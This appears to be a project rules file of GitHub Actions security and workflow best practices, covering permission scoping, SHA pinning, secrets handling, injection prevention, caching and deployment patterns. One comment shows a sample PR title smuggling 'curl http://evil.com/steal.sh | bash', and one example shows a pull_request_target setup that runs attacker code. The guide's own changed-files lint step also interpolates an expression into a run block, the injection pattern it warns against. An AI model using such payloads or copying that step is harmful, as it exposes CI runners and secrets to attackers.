---
description: GitHub Actions best practices for workflows, security (SHA pinning, least privilege), organization, and CI/CD patterns.
paths:
  - '.github/workflows/**/*.yml'
  - '.github/workflows/**/*.yaml'
  - '.github/workflows/**/*.yml*.jinja'
  - '.github/workflows/**/*.yaml*.jinja'
  - '.github/actions/**/*'
---

# GitHub Actions Best Practices

Best practices for writing and maintaining GitHub Actions workflows. Security is the primary concern; convenience never justifies weakening the security posture of CI/CD pipelines.

## Security

### Permissions

Always declare the narrowest possible permissions. GitHub grants `write-all` by default on many event types, which means a compromised step can push code, create releases, or modify issues.

- Set `permissions: {}` (empty) at the **workflow** level to revoke all defaults.
- Grant only the specific permissions each **job** needs.
- Never use `permissions: write-all` or `permissions: read-all`.

```yaml
# Good — default deny, per-job grants
permissions: {}

jobs:
  lint:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4

  deploy:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write # needed for OIDC
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4
```

```yaml
# Bad — grants write to everything
permissions: write-all

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4
```

### Third-Party Actions

Always pin third-party actions to the full 40-character commit SHA, not a mutable tag. Tags can be force-pushed to point at malicious commits — this has happened in real supply-chain attacks:

- **tj-actions/changed-files** (March 2025): Attacker re-pointed tags to inject credential-stealing code into thousands of CI pipelines.
- **aquasecurity/trivy-action** (March 2025): Similar tag-hijacking attack compromised workflows using mutable version tags.

Pinning to a commit SHA ensures you run exactly the code you reviewed.

```yaml
# Good — pinned to full SHA with version comment for maintainability
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
- uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5.6.0

# Bad — mutable tag can be hijacked
- uses: actions/checkout@v4
- uses: some-org/some-action@main
```

When updating a pinned action, always verify the new SHA corresponds to a legitimate release. Use Dependabot or Renovate to automate SHA update PRs and review the diffs.

### Secrets Management

- Scope secrets to individual **steps**, not entire jobs or workflows. Only the steps that need a secret should receive it.
- Never store structured data (JSON, YAML, entire config files) as a single secret. Parse failures can dump the raw value to logs.
- Use `::add-mask::` to mask dynamically generated values that should not appear in logs.
- Prefer **OIDC** (`id-token: write`) for cloud provider authentication instead of long-lived credential secrets. OIDC tokens are short-lived and scoped to the workflow run.
- Rotate secrets every 90 days. Set calendar reminders or automate rotation.
- See `rules/ENVIRONMENT_VARIABLES.md` for naming conventions, injection patterns, and general secrets hygiene.

```yaml
# Good — secret scoped to the step that needs it
steps:
  - name: Deploy
    run: ./deploy.sh
    env:
      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}

  - name: Notify
    run: echo "Deployment complete"
    # No access to DEPLOY_TOKEN here
```

### Script Injection Prevention

Never interpolate `${{ }}` expressions containing untrusted input directly in `run:` blocks. GitHub expands these expressions **before** the shell sees the script, which allows an attacker to inject arbitrary shell commands.

Untrusted inputs include: `github.event.pull_request.title`, `github.event.pull_request.body`, `github.head_ref`, `github.event.commits[*].message`, `github.event.issue.body`, `github.event.comment.body`, and any other user-controlled field.

```yaml
# Bad — attacker sets PR title to: a]]; curl http://evil.com/steal.sh | bash #
- name: Print PR title
  run: echo "PR: ${{ github.event.pull_request.title }}"

# Good — bind untrusted input to an environment variable
- name: Print PR title
  run: echo "PR: ${PR_TITLE}"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

When the untrusted value is bound to an environment variable, the shell treats it as a data string rather than executable code. Always use this pattern for any user-controlled input in `run:` blocks.

### Dangerous Triggers

The `pull_request_target` trigger runs in the context of the **base** branch with access to secrets, but can be tricked into checking out and executing code from the PR head. This is known as a "Pwn Request" attack and allows arbitrary code execution with write permissions.

- Never checkout the PR head ref (`github.event.pull_request.head.sha`) in a `pull_request_target` workflow unless the job has **no access to secrets** and **no elevated permissions**.
- Never use `secrets: inherit` with reusable workflows triggered by `pull_request_target`.
- Prefer `pull_request` trigger for most workflows. It runs in the context of the fork with read-only access by default, which is safe.

```yaml
# Dangerous — pull_request_target + PR head checkout = RCE
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Attacker-controlled code
      - run: make build  # Executes attacker code with base branch secrets

# Safe — use pull_request instead
on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
      - run: make build
```

### Runner Security

- Never use self-hosted runners on **public** repositories. Any pull request from a fork can execute arbitrary code on your infrastructure.
- Use **ephemeral** (single-use) runners when self-hosted runners are necessary. This prevents state leakage between workflow runs (cached credentials, modified tools, leftover files).
- Never run jobs as `root` or mount the Docker socket (`/var/run/docker.sock`) unless absolutely required and explicitly approved.
- Treat runner environments as **untrusted** — any previous job may have modified the environment.

### Auditing

- Add a `CODEOWNERS` entry for `.github/workflows/` so that workflow changes require review from designated approvers.
- Use [`zizmor`](https://github.com/woodruffw/zizmor) for static analysis of GitHub Actions workflows. It detects common security misconfigurations including injection vulnerabilities, overly broad permissions, and unpinned actions.
- Enable **Dependabot alerts** for GitHub Actions to receive notifications when pinned action SHAs have known vulnerabilities.
- Review the workflow run logs periodically for unexpected behavior or unauthorized secret access.

```yaml
# .github/CODEOWNERS
/.github/workflows/  @your-org/ci-reviewers
/.github/actions/    @your-org/ci-reviewers
```

## Variables & Configuration

### Secrets vs Variables

GitHub provides two mechanisms for storing configuration data — **secrets** and **variables**. Choose the right one based on sensitivity:

- **Secrets** are encrypted at rest, masked in logs, and not readable in the UI after creation. Use secrets for truly sensitive values: API keys, tokens, passwords, database credentials, and private keys.
- **Variables** are plaintext, visible and editable in the UI. Use variables for non-sensitive configuration: feature flags, environment names, public URLs, version numbers, and build options.

Rule of thumb: if you would be uncomfortable seeing the value in a workflow log, it is a secret.

```yaml
# Good — sensitive value in a secret, non-sensitive in a variable
steps:
  - name: Deploy
    run: ./deploy.sh
    env:
      API_TOKEN: ${{ secrets.DEPLOY_API_TOKEN }}
      ENVIRONMENT: ${{ vars.DEPLOY_ENVIRONMENT }}
      BASE_URL: ${{ vars.APP_BASE_URL }}

# Bad — non-sensitive config stored as a secret (wastes encrypted storage, harder to audit)
steps:
  - name: Deploy
    run: ./deploy.sh
    env:
      ENVIRONMENT: ${{ secrets.DEPLOY_ENVIRONMENT }}
```

### Scope and Precedence

Both secrets and variables can be defined at three scopes. When the same name exists at multiple scopes, the narrowest scope wins:

**Environment > Repository > Organization**

| Scope            | Use Case                                                                                                       |
| ---------------- | -------------------------------------------------------------------------------------------------------------- |
| **Organization** | Shared defaults across all repositories (e.g., org-wide registry URL, shared service account tokens).          |
| **Repository**   | Repo-specific values that apply to all environments (e.g., project name, default region).                      |
| **Environment**  | Values that differ per deployment target (e.g., staging vs production URLs, environment-specific credentials). |

- Use **environment-scoped** secrets and variables for any value that differs between deployment targets. This prevents accidental cross-environment leaks.
- Prefer **repository-scoped** over organization-scoped when only one repo needs the value. Narrower scope reduces blast radius.
- Never rely on precedence to "override" values silently. If a variable intentionally differs across scopes, document the override in the workflow file with a comment.

### Standard Environments

Every project uses three GitHub Environments to scope secrets and variables. Every job must declare an `environment:` so it only accesses the secrets it needs — a CI lint job should never see production deploy credentials.

| Environment       | Purpose                                                    | Used by                                 |
| ----------------- | ---------------------------------------------------------- | --------------------------------------- |
| **`development`** | CI workflows and dev deployments. Lowest sensitivity tier. | Lint, test, format, and dev deploy jobs |
| **`staging`**     | Staging deployments. Medium sensitivity.                   | Staging deploy jobs                     |
| **`production`**  | Production deployments. Highest sensitivity.               | Production deploy jobs only             |

**Rules:**

- Always set `environment:` on every job. Jobs without an `environment:` can only access repository-level and organization-level secrets, which defeats environment-based scoping.
- Put CI-specific secrets (e.g., code coverage tokens, notification webhooks) in the `development` environment. This keeps them out of `staging` and `production`.
- Put deploy credentials in the environment they deploy to. A staging deploy token belongs in `staging`, not `repository` scope.
- Never put the same secret in multiple environments. If a secret is truly shared, put it at repository scope. If it differs per environment, it belongs in each respective environment with the same name.

```yaml
# Good — CI job scoped to development, deploy job scoped to production
jobs:
  lint:
    environment: development
    runs-on: ubuntu-latest
    # Can access: development secrets + repo secrets
    # Cannot access: staging or production secrets

  deploy:
    environment: production
    runs-on: ubuntu-latest
    # Can access: production secrets + repo secrets
    # Cannot access: development or staging secrets
```

### Naming Conventions

Use `SCREAMING_SNAKE_CASE` for all secrets and variables. Prefix project-specific values with `{{ project_id | upper }}_` to avoid collisions with organization-level or third-party names.

```yaml
# Good — clear, prefixed, consistent
env:
  {{ project_id | upper }}_API_KEY: ${{ secrets.{{ project_id | upper }}_API_KEY }}
  {{ project_id | upper }}_DEPLOY_ENV: ${{ vars.{{ project_id | upper }}_DEPLOY_ENV }}
  GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

# Bad — ambiguous, no prefix, inconsistent casing
env:
  apiKey: ${{ secrets.apiKey }}
  deploy-env: ${{ vars.deploy-env }}
```

- Built-in GitHub secrets (like `GITHUB_TOKEN`) and well-known third-party names do not need a project prefix.
- Never use generic names like `TOKEN`, `SECRET`, or `PASSWORD` without a prefix — they collide across projects and make auditing impossible.
- See `rules/ENVIRONMENT_VARIABLES.md` for general naming conventions and secrets hygiene that apply beyond GitHub Actions.

## Workflow Organization

### File Naming

Use snake-case for workflow filenames with a category prefix. Every workflow, job, and step must have a human-readable `name:` field with a matching title prefix.

**Naming conventions:**

| Category               | Filename prefix | Title prefix | Example filename         | Example title          |
| ---------------------- | --------------- | ------------ | ------------------------ | ---------------------- |
| Continuous integration | `ci_`           | `CI - `      | `ci_lint.yml`            | `CI - Lint`            |
| Deployment             | `deploy_`       | `Deploy - `  | `deploy_web.yml`         | `Deploy - Frontend`    |
| Scheduled/one-off jobs | `job_`          | `Job - `     | `job_scrape_website.yml` | `Job - Scrape Website` |

```yaml
# Good — .github/workflows/ci_test.yml
name: 'CI - Test'

jobs:
  unit_tests:
    name: Unit Tests
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - name: Run tests
        run: pytest
```

```yaml
# Bad — .github/workflows/CI-Tests.yml (inconsistent casing, hyphens, no prefix)
# Bad — missing name fields
jobs:
  job1:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - run: pytest
```

Good filenames: `ci_test.yml`, `ci_lint.yml`, `deploy_web.yml`, `deploy_api.yml`, `job_scrape_website.yml`, `job_analyze_data.yml`.

### Single Responsibility

Each workflow file should own one concern. This keeps files small, makes failures easy to diagnose, and allows independent re-runs.

- `ci_test.yml` (`CI - Test`) — Run tests on pull requests and pushes.
- `ci_lint.yml` (`CI - Lint`) — Run linting and formatting checks.
- `ci_format.yml` (`CI - Format`) — Check code formatting.
- `deploy_web.yml` (`Deploy - Frontend`) — Deploy the frontend application.
- `deploy_api.yml` (`Deploy - API`) — Deploy the API service.
- `job_scrape_website.yml` (`Job - Scrape Website`) — Scheduled data scraping.
- `job_analyze_data.yml` (`Job - Analyze Data`) — Scheduled data analysis.

Never combine unrelated concerns (e.g., linting + deployment) in a single workflow. If two workflows share steps, extract shared logic into a reusable workflow or composite action instead.

### Reusable Workflows

Use `workflow_call` to share entire job definitions across workflows. Always pass secrets explicitly — never use `secrets: inherit`, which exposes every secret to the called workflow regardless of need.

```yaml
# .github/workflows/_shared_deploy.yml (reusable workflow)
name: 'Deploy - Shared'

on:
  workflow_call:
    inputs:
      environment:
        required: true
        type: string
    secrets:
      DEPLOY_TOKEN:
        required: true

permissions: {}

jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    environment: ${{ inputs.environment }}
    steps:
      - name: Checkout code
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - name: Deploy
        run: ./deploy.sh
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
          ENVIRONMENT: ${{ inputs.environment }}
```

```yaml
# .github/workflows/deploy_production.yml (caller)
name: 'Deploy - Production'

on:
  push:
    branches: [main]

permissions: {}

jobs:
  deploy:
    # Good — local workflow reference (no SHA needed for local paths)
    uses: ./.github/workflows/_shared_deploy.yml
    with:
      environment: production
    secrets:
      DEPLOY_TOKEN: ${{ secrets.PROD_DEPLOY_TOKEN }}

    # Bad — never do this
    # secrets: inherit
```

Prefix reusable workflow filenames with an underscore (`_shared_deploy.yml`) to visually distinguish them from top-level trigger workflows. Pin reusable workflow references to a full SHA when referencing across repositories.

### Composite Actions

Store composite actions in `.github/actions/<name>/action.yml`. Always specify `shell:` on every `run:` step — composite actions do not inherit a default shell. Define explicit `inputs` and `outputs`.

```yaml
# .github/actions/setup-project/action.yml
name: Setup Project
description: Install dependencies and configure the project environment.

inputs:
  python-version:
    description: Python version to install
    required: false
    default: '3.14'

outputs:
  cache-hit:
    description: Whether the dependency cache was hit
    value: ${{ steps.cache.outputs.cache-hit }}

runs:
  using: composite
  steps:
    - name: Set up Python
      uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5.6.0
      with:
        python-version: ${{ inputs.python-version }}

    - name: Cache dependencies
      id: cache
      uses: actions/cache@5a3ec84eff668545956fd18022155c47e93e2684 # v4.2.3
      with:
        path: ~/.cache/pip
        key: pip-${{ runner.os }}-${{ inputs.python-version }}-${{ hashFiles('**/requirements*.txt') }}

    - name: Install dependencies
      shell: bash
      run: pip install -r requirements.txt
```

Use composite actions to extract shared **steps** that appear in multiple jobs. This is different from reusable workflows, which share entire **jobs**.

### Project Custom Actions

The project includes a reusable composite action for detecting changed files:

**`.github/actions/changed-files/action.yml`** — Returns the list of files changed in the current event. On pull requests, returns all files changed in the branch. On push, returns files changed in the pushed commit.

| Input    | Description                                                   | Default          |
| -------- | ------------------------------------------------------------- | ---------------- |
| `filter` | File glob pattern (e.g., `*.py`, `*.ts`). Omit for all files. | `""` (all files) |

| Output      | Description                                       |
| ----------- | ------------------------------------------------- |
| `files`     | Newline-separated list of changed file paths      |
| `has_files` | `'true'` or `'false'` — whether any files matched |

```yaml
# Get changed Python files, then run a tool on only those files
- name: Get changed Python files
  id: changed
  uses: ./.github/actions/changed-files
  with:
    filter: '*.py'

- name: Lint changed files
  if: steps.changed.outputs.has_files == 'true'
  run: echo '${{ steps.changed.outputs.files }}' | xargs uv run ruff check
```

Use this action instead of inlining `git diff` logic in workflows. It handles the PR vs push distinction, filters out deleted files, and keeps the diff logic in one maintainable place.

### DRY Strategies

Choose the right deduplication tool based on scope:

| Strategy                     | Scope                     | Use When                                                                                      |
| ---------------------------- | ------------------------- | --------------------------------------------------------------------------------------------- |
| **YAML anchors** (`&` / `*`) | Within a single file      | Repeating the same value or block in one workflow file.                                       |
| **Composite actions**        | Across files (step-level) | The same sequence of steps appears in multiple jobs or workflows.                             |
| **Reusable workflows**       | Across files (job-level)  | The same job definition (with steps, permissions, environment) appears in multiple workflows. |

- Prefer composite actions over copy-pasting steps between workflow files.
- Prefer reusable workflows over duplicating entire job definitions.
- Never use `secrets: inherit` as a shortcut to avoid explicit secret passing in reusable workflows — security always outweighs convenience.

## Performance & Efficiency

### Caching

Cache dependencies aggressively to avoid re-downloading on every run. Slow installs are the most common source of wasted CI minutes.

- Prefer setup actions with built-in caching over manual `actions/cache` configuration:
  - **uv projects**: Use `astral-sh/setup-uv@37802adc94f370d6bfd71619e3f0bf239e1f3b78 # v7.6.0` — caching is enabled automatically on GitHub-hosted runners. It caches the uv package cache keyed on `uv.lock` and `pyproject.toml` by default. No separate cache step needed.
  - **pip projects**: Use `actions/setup-python` with `cache: pip` to handle cache paths and keys automatically.
  - **Node projects**: Use `actions/setup-node` with `cache: npm` for automatic npm/yarn/pnpm caching.
- Use `actions/cache` directly only when a setup action does not provide built-in caching (e.g., custom tool caches, Docker layers).
- Always provide `restore-keys` as a fallback when using `actions/cache` so a partial cache hit still saves time over a cold install.
- For Docker builds, enable GitHub Actions cache backend with `cache-from: type=gha` and `cache-to: type=gha,mode=max` to cache all layers, not just the final image.

```yaml
# uv project — setup-uv handles caching automatically
- name: Set up uv
  uses: astral-sh/setup-uv@37802adc94f370d6bfd71619e3f0bf239e1f3b78 # v7.6.0

- name: Install dependencies
  run: uv sync
```

```yaml
# Manual caching with actions/cache (when no setup action provides caching)
- name: Cache pip dependencies
  uses: actions/cache@5a3ec84eff668545956fd18022155c47e93e2684 # v4.2.3
  with:
    path: ~/.cache/pip
    key: pip-${{ runner.os }}-${{ hashFiles('**/requirements*.txt') }}
    restore-keys: |
      pip-${{ runner.os }}-
```

### Concurrency

Use `concurrency` groups to prevent redundant runs from piling up. Without concurrency controls, every push queues a new run even if the previous one is already obsolete.

- Set `cancel-in-progress: true` for PR workflows — the latest push is the only one that matters.
- Set `cancel-in-progress: false` for deployment workflows — canceling a deploy mid-flight can leave infrastructure in a broken state.

```yaml
# Cancel redundant PR runs, but never cancel deploys
on: pull_request

concurrency:
  group: ${{ github.workflow }}-${{ github.head_ref || github.run_id }}
  cancel-in-progress: true
```

### Parallelization

Split independent work into separate jobs so they run concurrently. A single monolithic job serializes everything and wastes time waiting.

- Use `needs:` only for true data dependencies between jobs — not as a way to impose order on unrelated work.
- Run lint and type-check as fast parallel jobs separate from the test suite. They typically finish in seconds and provide early feedback.
- Avoid fanning out into too many tiny jobs — each job has runner startup overhead (~15-30 seconds). Balance parallelism against startup cost.

### Matrix Strategies

Use matrix strategies for cross-version and cross-platform testing. A matrix is more maintainable than duplicating jobs by hand.

- Set `fail-fast: false` so all combinations run to completion. With the default `fail-fast: true`, a failure in one combination cancels the rest, hiding additional failures you need to know about.
- Use `include` to add specific one-off combinations and `exclude` to remove known-incompatible ones, rather than restructuring the entire matrix.
- Keep the total number of combinations under ~20. Larger matrices burn excessive minutes and provide diminishing returns.

```yaml
strategy:
  fail-fast: false
  matrix:
    python-version: ['3.12', '3.13', '3.14']
    os: [ubuntu-latest, macos-latest]
    exclude:
      - os: macos-latest
        python-version: '3.12'
```

### Conditional Execution

Skip workflows and jobs that are irrelevant to the changes in a push or PR. Running the full CI suite on every commit wastes minutes and slows feedback.

- Use `on.push.paths` and `on.pull_request.paths` to restrict entire workflows to relevant file changes.
- Use `if:` conditions on individual jobs or steps for finer-grained control within a workflow.
- Use the project's `.github/actions/changed-files` composite action to get the list of changed files for a given type (e.g., `*.py`), then run tools on only those files. See "Project Custom Actions" under Workflow Organization.
- For monorepos, use `dorny/paths-filter@de90cc6fb38fc0963ad72b210f1f284cd68cea36 # v3.0.2` to set per-job path filters as step outputs, so each job only runs when its own source files change.

```yaml
# Only run Python tests when Python source or config files change
on:
  pull_request:
    paths:
      - 'src/**/*.py'
      - 'tests/**/*.py'
      - 'pyproject.toml'
      - 'requirements*.txt'
```

## Reliability

### Timeouts

Always set `timeout-minutes` on every job. Without it, a stuck job runs for the default 6-hour maximum, silently burning through your Actions minutes.

- Set the timeout to roughly 3x the job's average duration. This leaves headroom for slow runs while still catching genuine hangs.
- Set tighter timeouts on individual long-running steps when the job contains a mix of fast and slow operations.

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - name: Run tests
        timeout-minutes: 10
        run: pytest
```

### Error Handling

Use GitHub Actions' built-in status functions to handle failures gracefully. Unhandled failures can leave resources dangling or skip critical notifications.

- Use `continue-on-error: true` for non-critical steps that should not block the workflow (e.g., optional linters, coverage uploads).
- Use `if: failure()` to run cleanup steps only when a previous step fails.
- Use `if: always()` for steps that must run regardless of outcome — notifications, resource teardown, artifact uploads.
- Use step outputs and `if:` conditions to build conditional logic based on the results of earlier steps.

```yaml
steps:
  - name: Run tests
    id: tests
    run: pytest --junitxml=results.xml

  - name: Upload results
    if: always()
    uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
    with:
      name: test-results
      path: results.xml

  - name: Notify on failure
    if: failure()
    run: echo "Tests failed — see artifacts for details"
```

### Retries

Use retries only for transient failures like network timeouts or registry rate limits. Retrying deterministic failures masks real bugs.

- Use a community retry action like `nick-fields/retry`, pinned to a full SHA like all other third-party actions.
- Cap retries at 2-3 attempts. More than that usually means the failure is not transient.
- Always set a per-attempt timeout so a hung attempt does not block the retry loop indefinitely.

```yaml
- name: Install dependencies
  uses: nick-fields/retry@7152eba30c6575329ac0576536151aca5a72780e # v3.0.0
  with:
    timeout_minutes: 5
    max_attempts: 3
    command: pip install -r requirements.txt
```

### Idempotency

Design all workflow operations to be safe to re-run. GitHub may retry steps automatically on infrastructure failures, and developers frequently re-run failed workflows manually.

- Never assume a step runs exactly once — retried steps may execute the same operation multiple times.
- Use `CREATE IF NOT EXISTS` semantics for resource provisioning (tags, releases, deployments).
- Avoid side effects that compound on repeated execution (e.g., appending to a file that already exists from a previous run).

### Runner Pinning

Prefer `ubuntu-latest` (and `macos-latest`, `windows-latest`) for most workflows. Rolling tags keep runners current with security patches and toolchain updates, which is the right default.

- **Tradeoff**: `ubuntu-latest` can break workflows without any code change when GitHub rolls a new image. If a workflow suddenly fails after no code changes, check whether the runner image was updated.
- Pin to a specific version (`ubuntu-24.04`) only when reproducibility is critical — compliance-sensitive pipelines, builds that depend on exact system library versions, or workflows that have broken from image updates before.
- When using specific versions, track GitHub's runner deprecation schedule and update proactively. Deprecated runner images are removed with limited notice.

## CI/CD Patterns

### Job Structure

Structure workflows so that fast feedback comes first. Run linting and type-checking as a short parallel job, tests as a separate job (optionally with a matrix for multiple Python versions or OS targets), and gate deployments on both passing via `needs:`.

```yaml
name: 'CI - Test'

on:
  pull_request:
  push:
    branches: [main]

permissions: {}

jobs:
  lint:
    name: Lint & Type Check
    runs-on: ubuntu-latest
    environment: development
    timeout-minutes: 5
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: astral-sh/setup-uv@37802adc94f370d6bfd71619e3f0bf239e1f3b78 # v7.6.0
      - run: uv sync
      - run: uv run ruff check .
      - run: uv run ty check

  test:
    name: Tests
    runs-on: ubuntu-latest
    environment: development
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: astral-sh/setup-uv@37802adc94f370d6bfd71619e3f0bf239e1f3b78 # v7.6.0
      - run: uv sync
      - run: uv run pytest

  deploy:
    name: Deploy - Production
    needs: [lint, test]
    runs-on: ubuntu-latest
    environment: production
    if: github.ref == 'refs/heads/main'
    permissions:
      contents: read
      id-token: write
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - run: echo "Deploy steps here"
```

### Environment Protection

Configure GitHub Environment protection rules on the three standard environments (see "Standard Environments" under Variables & Configuration) to enforce progressively stricter gates as changes move toward production.

| Environment       | Protection Rules                                                | Branch Restrictions                           |
| ----------------- | --------------------------------------------------------------- | --------------------------------------------- |
| **`development`** | No protection rules. CI and dev deploys run without gates.      | None — all branches can use this environment. |
| **`staging`**     | Wait timer (e.g., 5 minutes) and/or limited required reviewers. | Restrict to `main` and release branches.      |
| **`production`**  | At least one reviewer approval required. Optional wait timer.   | Restrict to `main` only.                      |

- Use environment deployment branch restrictions to prevent accidental production deployments from feature branches.
- Never allow direct pushes to bypass production review requirements.

### Artifact Management

Use `actions/upload-artifact` to preserve test reports, coverage data, and build outputs — but only what is needed.

- Upload test reports only on failure to avoid storing unnecessary data on every run.
- Compress artifacts before upload when possible (e.g., tar/gzip a directory of reports).
- Shorten retention periods. The default 90 days is excessive for most CI artifacts — 7-14 days is usually sufficient.
- Never upload secrets, credentials, or `.env` files as artifacts.

```yaml
- name: Upload test report
  if: failure()
  uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
  with:
    name: test-report
    path: reports/
    retention-days: 7
    compression-level: 9
```

### Deployment Patterns

Choose the deployment pattern that matches your risk tolerance and release cadence.

- **Progressive deployment**: Dev -> Staging -> Production. Each environment gates on the previous one passing. This is the default for most projects.
- **Manual triggers**: Use `workflow_dispatch` with input parameters for on-demand deployments. Define inputs with descriptions, types, and defaults so the trigger UI is self-documenting.
- **Workflow chaining**: Use `workflow_run` to trigger a deployment workflow after a CI workflow completes. This keeps CI and CD concerns separated into distinct workflow files.
- **Tag-based releases**: Trigger deployments on tag pushes (e.g., `v*`) for versioned releases. Combine with GitHub Releases for changelog generation and artifact attachment.

```yaml
on:
  workflow_dispatch:
    inputs:
      environment:
        description: 'Target environment'
        required: true
        type: choice
        options:
          - dev
          - staging
          - production
      dry_run:
        description: 'Dry run (no actual deployment)'
        required: false
        type: boolean
        default: false
```

## Maintainability

### Treat Workflows as Production Code

Workflow files are infrastructure — apply the same quality standards as application code. A broken workflow blocks the entire team.

- Require pull request reviews for all workflow changes. See `rules/PULL_REQUEST.md` for review standards that apply equally to workflow code.
- Add a `CODEOWNERS` entry for `.github/workflows/` and `.github/actions/` so changes always route to the right reviewers.
- Test workflow changes in feature branches before merging. Use `workflow_dispatch` or a `pull_request` trigger scoped to the workflow file path to validate changes without affecting `main`.

### Version Pinning

Pin every third-party action to a full commit SHA with a version comment. Tags like `@v3` can be moved after a supply-chain compromise — SHAs cannot.

- Always include the human-readable version in a trailing comment: `# v4`.
- Enable Dependabot for GitHub Actions to receive automated update PRs when new versions are released.
- Version your own reusable workflows and composite actions with tags or releases. Consumers should pin to a specific version, not `@main`.

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: 'github-actions'
    directory: '/'
    schedule:
      interval: 'weekly'
```

### Documentation

Write workflows that explain themselves. A well-named workflow is easier to debug at 2 AM than a clever one.

- Always set a descriptive `name:` on every workflow, job, and step. Omitting names makes the Actions UI and logs difficult to navigate.
- Comment non-obvious conditional logic (`if:` expressions) explaining the business reason, not restating the condition.
- Document environment variable purposes inline, especially variables consumed by downstream steps.

### Local Testing

Validate workflow changes locally before pushing to save CI minutes and iteration time.

- Use [`act`](https://github.com/nektos/act) to run workflows locally. It does not cover every GitHub Actions feature but catches most YAML syntax and logic errors.
- Use [`zizmor`](https://github.com/woodruffw/zizmor) for static analysis of workflow files. It detects security issues, misconfigurations, and common mistakes.

## Anti-Patterns

Quick-reference table of common GitHub Actions anti-patterns and their corrections.

| Anti-pattern                                       | Why it's wrong                                                            | Correct approach                                                |
| -------------------------------------------------- | ------------------------------------------------------------------------- | --------------------------------------------------------------- |
| Hardcoded secrets in YAML                          | Secrets persist in git history and are visible to anyone with repo access | Use GitHub Secrets and reference via `${{ secrets.NAME }}`      |
| `permissions: write-all`                           | Violates least privilege; a compromised step can modify anything          | Set `permissions: {}` at workflow level, grant per-job          |
| `${{ github.event.pull_request.title }}` in `run:` | Script injection — attacker-controlled PR title executes as shell code    | Bind to an environment variable, quote in shell                 |
| `pull_request_target` + PR head checkout           | Remote code execution — runs untrusted code with write permissions        | Use `pull_request` trigger instead                              |
| Pinning actions to tags (`@v3`)                    | Tags can be force-pushed after a supply-chain compromise                  | Pin to full commit SHA with version comment                     |
| `secrets: inherit` on reusable workflows           | Over-shares every secret with the called workflow                         | Explicitly pass only the secrets needed                         |
| No `timeout-minutes` on jobs                       | Stuck jobs run for 6 hours by default, wasting compute                    | Set timeout to roughly 3x average duration                      |
| No `concurrency` controls                          | Redundant runs on rapid pushes waste minutes and cause race conditions    | Use concurrency groups with `cancel-in-progress`                |
| Monolithic workflows (one file does everything)    | Hard to debug, maintain, and selectively re-run                           | One workflow per concern (lint, test, deploy)                   |
| Writing untrusted data to `GITHUB_ENV`             | Environment variable injection — attacker controls subsequent steps       | Validate and sanitize all inputs before writing to `GITHUB_ENV` |
| Self-hosted runners on public repos                | Any PR author can execute arbitrary code on your infrastructure           | Use GitHub-hosted runners for public repositories               |
